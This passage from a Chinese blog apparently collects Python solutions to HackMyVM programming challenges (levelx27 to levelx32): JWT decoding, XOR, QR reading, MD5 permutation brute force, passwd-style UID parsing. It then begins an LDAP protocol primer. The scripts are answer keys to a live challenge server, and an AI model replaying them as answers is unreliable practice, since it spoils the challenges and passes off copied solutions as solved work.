    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx27'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    data3 <span class="token operator">=</span> response<span class="token punctuation">.</span>text
    pattern <span class="token operator">=</span> <span class="token string">r'proxy:x:(\d+):'</span>
    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> data3<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
         proxy_uid <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
         data3<span class="token operator">=</span>proxy_uid
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx28-解码jwt获取payload部分"><a href="#levelx28-解码jwt获取payload部分" class="headerlink" title="levelx28 解码jwt获取payload部分"></a>levelx28 解码jwt获取payload部分</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> jwt
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> json
HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>

<span class="token keyword">def</span> <span class="token function">base64_url_decode</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 添加缺失的填充字符</span>
    padding <span class="token operator">=</span> <span class="token string">'='</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">)</span>
    <span class="token builtin">input</span> <span class="token operator">=</span> <span class="token builtin">input</span> <span class="token operator">+</span> padding
    <span class="token comment"># 将Base64 URL编码转换为标准Base64编码</span>
    <span class="token builtin">input</span> <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span>
    <span class="token comment"># 解码Base64字符串</span>
    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span>


<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx28'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span><span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> data3<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    data3<span class="token operator">=</span>base64_url_decode<span class="token punctuation">(</span>data3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data3<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data3<span class="token punctuation">[</span><span class="token string">'HMVKey'</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx29-计算距离"><a href="#levelx29-计算距离" class="headerlink" title="levelx29 计算距离"></a>levelx29 计算距离</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> re
<span class="token keyword">from</span> geopy<span class="token punctuation">.</span>distance <span class="token keyword">import</span> geodesic

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Receiving Intro"</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"levelx29"</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    pattern <span class="token operator">=</span> <span class="token string">r"Lat: (\d+) Lon: (\d+) - Lat: (\d+) Lon: (\d+)"</span>
    matches <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> data2<span class="token punctuation">)</span>
    <span class="token keyword">if</span> matches<span class="token punctuation">:</span>
        coord1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>matches<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>matches<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        coord2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>matches<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>matches<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    distance <span class="token operator">=</span> geodesic<span class="token punctuation">(</span>coord1<span class="token punctuation">,</span> coord2<span class="token punctuation">)</span><span class="token punctuation">.</span>kilometers
    formatted_distance <span class="token operator">=</span> <span class="token string">"&#123;:.3f&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>distance<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>formatted_distance<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data3 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span></code></pre>
<h2 id="levelx30-异或"><a href="#levelx30-异或" class="headerlink" title="levelx30 异或"></a>levelx30 异或</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket  

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>  
PORT <span class="token operator">=</span> <span class="token number">9988</span>  
<span class="token keyword">def</span> <span class="token function">xor_encrypt_decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> key<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>  
    key_bytes <span class="token operator">=</span> key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    key_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key_bytes<span class="token punctuation">)</span>  
    data_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>  
    <span class="token keyword">if</span> key_length <span class="token operator">&lt;</span> data_length<span class="token punctuation">:</span>  
        key_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>key_bytes <span class="token operator">*</span> <span class="token punctuation">(</span>data_length <span class="token operator">//</span> key_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span>data_length<span class="token punctuation">]</span>  
    <span class="token keyword">elif</span> key_length <span class="token operator">></span> data_length<span class="token punctuation">:</span>  
        key_bytes <span class="token operator">=</span> key_bytes<span class="token punctuation">[</span><span class="token punctuation">:</span>data_length<span class="token punctuation">]</span>  
      
    result <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>a <span class="token operator">^</span> b <span class="token keyword">for</span> a<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key_bytes<span class="token punctuation">)</span><span class="token punctuation">)</span>  
    <span class="token keyword">return</span> result  

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>  
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>  
  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>  
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> data <span class="token keyword">else</span> <span class="token string">"No data received"</span><span class="token punctuation">)</span>  
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx30'</span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>  
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> data2 <span class="token keyword">else</span> <span class="token string">"No challenge received"</span><span class="token punctuation">)</span>  
    key <span class="token operator">=</span> <span class="token string">'HMV'</span>
    xor_result <span class="token operator">=</span> xor_encrypt_decrypt<span class="token punctuation">(</span>data2<span class="token punctuation">,</span> key<span class="token punctuation">)</span>  
    solution <span class="token operator">=</span> xor_result<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>solution<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving flag.'</span><span class="token punctuation">)</span>  
    data3 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> data3 <span class="token keyword">else</span> <span class="token string">"No flag received"</span><span class="token punctuation">)</span></code></pre>
<h2 id="levelx31-读二维码"><a href="#levelx31-读二维码" class="headerlink" title="levelx31 读二维码"></a>levelx31 读二维码</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> base64
<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
<span class="token keyword">import</span> cv2
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
<span class="token keyword">from</span> pyzbar<span class="token punctuation">.</span>pyzbar <span class="token keyword">import</span> decode
HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>
<span class="token keyword">def</span> <span class="token function">decode_qr_and_extract_text</span><span class="token punctuation">(</span>encoded_png_base64<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 解码 base64 编码的 PNG 图像</span>
    decoded_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>encoded_png_base64<span class="token punctuation">)</span>
    image <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>BytesIO<span class="token punctuation">(</span>decoded_data<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># 将图像转换为灰度图像</span>
    gray_image <span class="token operator">=</span> image<span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span>

    <span class="token comment"># 将 PIL 灰度图像转换为 NumPy 数组</span>
    np_image <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>gray_image<span class="token punctuation">)</span>

    <span class="token comment"># 使用 Pyzbar 解码 QR 码</span>
    qr_codes <span class="token operator">=</span> decode<span class="token punctuation">(</span>np_image<span class="token punctuation">)</span>

    <span class="token comment"># 提取 QR 码中的文本信息</span>
    decoded_text <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> qr <span class="token keyword">in</span> qr_codes<span class="token punctuation">:</span>
        decoded_text <span class="token operator">+=</span> qr<span class="token punctuation">.</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> decoded_text
<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx31'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>decode_qr_and_extract_text<span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data3<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx32-字符串全排列碰撞md5"><a href="#levelx32-字符串全排列碰撞md5" class="headerlink" title="levelx32 字符串全排列碰撞md5"></a>levelx32 字符串全排列碰撞md5</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> hashlib
HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>
<span class="token keyword">def</span> <span class="token function">permute_until_md5_match</span><span class="token punctuation">(</span>md5_hash<span class="token punctuation">,</span> input_string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Convert the input string to a list of characters</span>
    input_list <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>input_string<span class="token punctuation">)</span>

    <span class="token comment"># Generate permutations of the input string</span>
    permutations <span class="token operator">=</span> itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span>input_list<span class="token punctuation">)</span>

    <span class="token comment"># Loop through each permutation</span>
    <span class="token keyword">for</span> perm <span class="token keyword">in</span> permutations<span class="token punctuation">:</span>
        <span class="token comment"># Join the characters back into a string</span>
        perm_string <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>perm<span class="token punctuation">)</span>

        <span class="token comment"># Calculate the MD5 hash of the permutation</span>
        perm_md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>perm_string<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token comment"># If the MD5 hash matches the given MD5 hash, return the permutation</span>
        <span class="token keyword">if</span> perm_md5 <span class="token operator">==</span> md5_hash<span class="token punctuation">:</span>
            <span class="token keyword">return</span> perm_string

    <span class="token comment"># If no permutation matches, return None</span>
    <span class="token keyword">return</span> <span class="token boolean">None</span>
<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx32'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span><span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> data3<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    data3<span class="token operator">=</span>permute_until_md5_match<span class="token punctuation">(</span>data3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>data3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data3<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>python编程练习</tag>
      </tags>
  </entry>
  <entry>
    <title>LDAP协议</title>
    <url>/posts/3e4e3078/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>LDAP(Lightweight Directory Access Protocol)，轻型目录访问协议。它是基于X.500标准的轻量级目录访问协议。LDAP通常将信息以树的形式存储，一个对象下可以有多个子对象，这样的结构叫做DIT(Directory Information Tree),即目录信息树。</p>
<p>活动目录是微软面向Windows Standard Server，Windows Enterprise Server以及Windows Datacenter Server 提供的，它存储了有关网络对象的信息，并且让管理员和用户能够轻松地查找和使用这些信息。活动目录使用了一种结构化的数据存储方式，并且以此作为基础对目录信息进行合乎逻辑的分层组织。大多数web应用在尝试使用统一身份认证的时候，就是使用LDAP作为支撑，保证了统一用户身份认证存储。LDAP支持跨平台，可以在单独的服务器上部署实现LDAP，实现与域控相同的功能，从而任何应用都可以直接访问LDAP目录实现认证，信息获取，信息存储，并不是完全依赖域控。</p>
<h1 id="LDAP基础"><a href="#LDAP基础" class="headerlink" title="LDAP基础"></a>LDAP基础</h1><ol>
<li><p>基础模型<br><strong>信息模型:</strong> LDAP的信息表示方式。因为是面向对象的数据库，所以用户对象，计算机对象等通过对象类描述。对象类包含类和属性，为了应付多而复杂的层级关系，在设计时赋予了类继承的特性，降低了复杂度。<br><strong>命名模型:</strong> LDAP中的条目定位方式。在LDAP中，每个对象都拥有独一无二的<code>DN属性</code>和<code>RDN</code>，DN是整个树中唯一的表示，RDN是DN中每一个用逗号分隔开的表达式，如”CN&#x3D;admin,DC&#x3D;123root,DC&#x3D;cin”中有3个RDN。<br><strong>功能模型:</strong> 包括查询类操作，如搜索，比较；更新类操作，如添加目录，删除条目，修改条目或条目名；认证类操作，如绑定，解绑；其他操作，如放弃和扩展等。<br><strong>安全模型:</strong> LDAP中的安全模型提供3种认证机制，即<code>匿名认证</code>，<code>基本认证</code>和<code>SASL</code>(Simple Authentication and Secure Layer)认证。匿名认证即不对用户进行认证，该方法仅对完全公开的方式适用；基本认证是通过用户名和密码进行身份识别，又分为简单密码认证和摘要密码认证；SASL认证是在SSL和TLS安全通道基础上进行的身份认证，包括数字证书的认证。</p>
</li>
